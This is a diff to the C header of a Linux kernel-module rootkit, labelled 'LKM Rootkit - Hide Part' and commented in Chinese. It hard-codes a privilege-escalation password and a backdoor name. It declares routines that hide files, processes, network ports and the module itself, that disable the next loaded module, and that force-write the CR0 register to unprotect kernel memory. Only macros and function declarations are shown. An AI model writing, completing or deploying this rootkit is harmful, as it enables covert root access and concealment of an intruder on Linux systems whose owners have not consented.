@@ -13,18 +13,20 @@
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
 #include <net/sock.h>
+#include <linux/moduleparam.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Eidos");
 MODULE_DESCRIPTION("LKM Rootkit - Hide Part");
-/**
- * 部分宏定义以方便函数撰写。 
- */
+
+/* ---------------------------- *
+ *            宏定义            * 
+ * ---------------------------- */
 
 // 提权所需口令
 #define PASSWORD "ELPSYKONGROO"
-#define BACKDOOR "STEINSGATE" // 后门需要利用文件隐藏藏好
-#define BACKDOOR_PATH "/proc/STEINSGATE" // 因此需要特地先藏好这个文件路径
+#define BACKDOOR "STEINSGATE" // 后门需要藏好
+#define BACKDOOR_PATH "/proc" // 因此需要特地先藏好这个文件路径
 
 // 模块隐藏所需参数
 #define MODULE_NAME "hide" // 模块名称记为hide（可修改）
@@ -36,12 +38,41 @@ MODULE_DESCRIPTION("LKM Rootkit - Hide Part");
 #define TCP6_NET_ENTRY "/proc/net/tcp6"
 #define UDP4_NET_ENTRY "/proc/net/udp"
 #define UDP6_NET_ENTRY "/proc/net/udp6"
+#define NEEDLE_LEN 6
 
 // 进程隐藏所需参数
-#define PATH "/proc"
+#define PROC_HIDE_PATH "/proc"
+
+/* -------------------------------------- *
+ *              功能模块                   *
+ * -------------------------------------- */
 
 // 后门添加
 void backdoor(void);
 void cleanbackdoor(void);
+
+// 取代下一个模块的正常功能
+void disable_module(void);
+void disable_module_exit(void);
+
+// 文件隐藏
+void hide_file(void);
+void hide_file_cleanup(void);
+
+// hide process
+void proc_hide(void);
+void proc_unhide(void);
+
+// hide ports.
+void port_hide(void);
+void port_unhide(void);
+
+// hide mod
+void mod_hide(void);
+void mod_unhide(void);
+
+void write_cr0_forced(unsigned long val);
+void unprotect_memory(void);
+void protect_memory(void);
 
 #endif
